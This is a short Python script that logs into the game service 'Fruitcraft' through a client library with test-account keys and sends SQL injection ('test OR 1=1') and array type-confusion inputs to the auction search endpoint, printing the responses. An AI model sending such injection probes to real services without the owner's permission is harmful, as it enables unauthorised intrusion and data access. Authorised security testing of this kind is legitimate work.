import sys, os, time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'api')))
from fruitcraft_client import FruitClient

def main():
    c1 = FruitClient()
    s1, d1 = c1.login(os.environ.get("TEST_ACC_1_KEY", "REDACTED_KEY_1"), os.environ.get("TEST_ACC_1_UDID", "REDACTED_UDID_1"))
    if not s1: return
    
    print('\n[+] Testing SQLi on auction search (query)')
    res = c1.post('/auction/search', {'query': 'test OR 1=1'})
    print('OR String:', res.get('status') if isinstance(res, dict) else res)
    time.sleep(1)

    res = c1.post('/auction/search', {'query': [1,2,3]})
    print('Array:', res.get('status') if isinstance(res, dict) else res)

if __name__ == '__main__':
    main()
